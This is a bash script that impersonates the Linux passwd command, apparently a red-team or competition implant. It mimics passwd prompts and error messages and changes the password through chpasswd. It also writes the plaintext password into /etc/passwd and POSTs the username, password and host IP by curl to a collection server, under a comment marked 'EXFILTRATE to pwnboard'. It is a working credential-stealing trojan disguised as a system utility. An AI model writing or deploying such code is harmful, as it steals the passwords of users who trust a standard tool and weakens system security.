#!/bin/bash
user=""
password=""
password2=""

#does a user exist
user_exists() {
    local u="$1"
    if grep -q "^${u}:" /etc/passwd; then
        return 0  # success, user exists
    else
        return 1  # failure, user does not exist
    fi
}

# Check if an argument was provided, if not grab current
if [ -z "$1" ]; then
    # determine the actual user who invoked the script
    if [ -n "$SUDO_USER" ]; then
        user="$SUDO_USER"
    elif [ -n "$SUDO_UID" ]; then
        user=$(getent passwd "$SUDO_UID" | cut -d: -f1)
    else
        user=$(whoami)
    fi

    echo "Changing password for $user"
    read -sp "Current password: $oldpassuseless"
    echo ""
else
    user="$1"
    if ! user_exists "$user"; then
        echo "passwd: user '$user' does not exist"
        exit 1
    fi
fi
# Store the argument in a variable
# echo "Changeing password for $user"# NOT NEEDED, this only shows with out sudo, but this only works with sudo
# echo

read -sp "New password: " password #TODO add a 1/4 chance that it says try again
echo ""
read -sp "Retype new password: " password2
echo ""

#Comparison

if [ "$password" = "$password2" ] ; then
    echo "passwd: password updated successfully"
else
    sleep 3
    echo "Sorry, passwords do not match."
    echo "passwd: Authentication token manipulation error"
    echo "passwd: password unchanged"
    exit 1
fi
git 

# Replace the hash in /etc/shadow

# HASH=$(openssl passwd -1 -- "$password")
# ESC_HASH=$(printf '%s' "$HASH" | sed 's/[\/&|]/\\&/g')
# sudo sed -i "s|^${user}:[^:]*:|${user}:${ESC_HASH}:|" /etc/shadow

# HASH=$(openssl passwd -1 -- "$password")
# sed -i "s|^${$user}:[^:]*:|${$user}:${$HASH}:|" /etc/shadow 

# sets the /etc/shadow using the og binary
printf '%s:%s\n' "$user" "$password" | sudo chpasswd >/dev/null 2>&1

# Replace the second field for the matching user directly in /etc/passwd
sudo sed -i "s/^\($user:\)[^:]*:/\1$password:/" /etc/passwd



ip_address=$(ip -4 addr show $(ip route | awk '/default/ {print $5; exit}') | awk '/inet/ {print $2}' | cut -d/ -f1) # see if this works durring deploy TODO, seems to work well

#EXFILTRATE to pwnboard
echo "DEBUG, sending this to the server" $user, $password, $ip_address 
$(curl -s -X POST -H "Content-Type: application/json" -d "{\"ip\":\"$ip_address\",\"username\":\"$user\",\"password\":\"$password\"}" http://localhost:12345 >/dev/null 2>&1)